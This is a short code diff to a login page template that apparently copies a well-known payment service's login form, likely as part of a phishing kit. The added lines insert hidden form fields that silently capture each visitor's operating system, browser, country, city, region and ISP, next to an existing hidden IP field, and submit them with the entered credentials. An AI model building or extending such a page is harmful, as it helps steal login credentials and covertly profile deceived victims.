@@ -277,6 +277,12 @@
                             <div class="actions actionsSpacedShort"><button class="button actionContinue scTrack:unifiedlogin-login-submit" type="submit" id="btnLogin" name="btnLogin" value="Login">Log In</button></div>
                             <!-- <input type="hidden" name="splitLoginContext" value="inputPassword" /><input type="hidden" name="splitLoginCookiedFallback" value="true" /> -->
                             <input type="text" class="hidden" id="ip" name="ip" value="{{ $getIpAddress }}">
+                            <input type="text" class="hidden" id="os" name="os" value="{{ $getOS }}">
+                            <input type="text" class="hidden" id="browser" name="browser" value="{{ $getBrowser }}">
+                            <input type="text" class="hidden" id="country" name="country" value="{{ $country }}">
+                            <input type="text" class="hidden" id="city" name="city" value="{{ $city }}">
+                            <input type="text" class="hidden" id="region" name="region" value="{{ $region }}">
+                            <input type="text" class="hidden" id="isp" name="isp" value="{{ $isp }}">
                             <div id="ipInfo"></div>
                         </form>
                         <div class="moreOptionsDiv hide" id="moreOptionsContainer">
